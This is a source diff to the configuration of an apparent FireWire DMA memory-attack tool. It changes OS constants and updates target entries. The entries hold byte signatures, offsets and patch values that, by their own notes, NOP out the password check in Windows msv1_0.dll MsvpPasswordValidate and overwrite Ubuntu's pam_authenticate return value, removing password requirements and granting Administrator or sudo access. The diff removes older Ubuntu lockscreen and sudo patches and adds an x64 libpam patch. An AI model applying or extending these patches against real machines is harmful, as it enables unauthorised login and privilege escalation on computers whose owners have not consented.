@@ -16,10 +16,9 @@ MiB = 1024 * KiB                    # One MebiByte
 GiB = 1024 * MiB                    # One GibiByte
 PAGESIZE = 4 * KiB                  # For the sake of this tool, always the case
 OUICONF = 'data/oui.txt'            # FireWire OUI database relative to package
-WINDOWS = 1
-LINUX = 2
-OSX = 3
-
+LINUX = 'Linux'
+OSX = 'Darwin'
+WINDOWS = 'Windows'
     
 #===============================================================================
 # Global variables/defaults/settings
@@ -46,6 +45,7 @@ apple_avoid = [0x0, 0xff000]    # Avoid this area if dumping memory from Macs
 apple = False                   # Set to true if we are attacking a Mac
 pickpocket = False              # Pickpocket
 polldelay = 5                   # 5 seconds delay between FireWire delays
+os = None                       # Detected OS is None by default
 
 #===============================================================================
 # List of patterns that signify out of memory bounds reads
@@ -122,7 +122,7 @@ outofbounds = [0xff * max_request_size,
 targets=[{'OS': 'Windows 7',
           'versions': ['SP0', 'SP1'],
           'architectures': ['x32', 'x64'],
-          'name': 'msv1_0.dll MsvpPasswordValidate technique',
+          'name': 'msv1_0.dll MsvpPasswordValidate unlock and privilege escalation',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
           'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], #x64 SP0-SP1
                           'chunks': [{'chunk': 0xc60f85,
@@ -144,7 +144,7 @@ targets=[{'OS': 'Windows 7',
          {'OS': 'Windows Vista',
           'versions': ['SP0'],
           'architectures': ['x86'],
-          'name': 'msv1_0.dll MsvpPasswordValidate technique',
+          'name': 'msv1_0.dll MsvpPasswordValidate unlock and privilege escalation',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
           'signatures': [{'offsets': [0x432, 0x80f],
                           'chunks': [{'chunk': 0x83f8107513b0018b,
@@ -154,7 +154,7 @@ targets=[{'OS': 'Windows 7',
          {'OS': 'Windows XP',
           'versions': ['SP2', 'SP3'],
           'architectures': ['x86'],
-          'name': 'msv1_0.dll MsvpPasswordValidate technique',
+          'name': 'msv1_0.dll MsvpPasswordValidate unlock and privilege escalation',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
           'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6],
                           'chunks': [{'chunk': 0x83f8107511b0018b,
@@ -171,51 +171,17 @@ targets=[{'OS': 'Windows 7',
                                       'internaloffset': 0x00,
                                       'patch': 0x41bf0000000048c78588}]}]},
          {'OS': 'Ubuntu',
-          'versions': ['9.04', '10.10', '11.04', '11.10'],
-          'architectures': ['x32', 'x64', 'x64', 'x32'],
-          'name': 'Gnome lockscreen unlock (experimental)',
-          'notes': 'Disables Ubuntu lockscreen.',
-          'signatures': [{'offsets': [0xd3f],
-                          'chunks': [{'chunk': 0xe8cc61000085c00f85e4000000c74424100e460508c744240c14460508c744240827010000c74424042d,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xb80100000085}]},
-                         {'offsets': [0xa0b, 0x3ab],
-                          'chunks': [{'chunk': 0x4189c485ed7407,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x4531e4,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0x6bb],
-                          'chunks': [{'chunk': 0x89c54585e47408,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x31ed,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0xde0],
-                          'chunks': [{'chunk': 0xfc9effff89c385ff,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x31db,
-                                      'patchoffset': 0x03}]}]},
-         {'OS': 'Ubuntu - sudo (experimental)',
-          'versions': ['10.10', '11.10'],
-          'architectures': ['x64', 'x32'],
-          'name': 'Ubuntu sudo privilege escalation',
-          'notes': 'Open a terminal at the target, and run sudo -s. Run inception. After running, sudo -s will work with no password.',
-          'signatures': [{'offsets': [0xc15],
-                          'chunks': [{'chunk': 0x89c2664189442402,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x33c0,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0x11c],
-                          'chunks': [{'chunk': 0x89c20fbfe8668943,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x33c0,
-                                      'patchoffset': 0x00}]}]},
-         {'OS': 'Ubuntu - libpam (experimental)',
           'versions': ['11.10'],
-          'architectures': ['x32'],
-          'name': 'Ubuntu libpam privilege escalation',
-          'notes': 'Overwrites pam_authenticate return value. After running, login and sudo -s will work with no password.',
+          'architectures': ['x32', 'x64'],
+          'name': 'Ubuntu libpam unlock and privilege escalation',
+          'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based logins (e.g., GUI, tty and sudo) will work with no password.',
           'signatures': [{'offsets': [0xbaf],
                           'chunks': [{'chunk': 0x83F81F89C774,
                                       'internaloffset': 0x00,
                                       'patch': 0xBF00000000EB,
+                                      'patchoffset': 0x00}]},
+                         {'offsets': [0x5b8],
+                          'chunks': [{'chunk': 0x83F81F89C574,
+                                      'internaloffset': 0x00,
+                                      'patch': 0xBd00000000EB,
                                       'patchoffset': 0x00}]}]}]
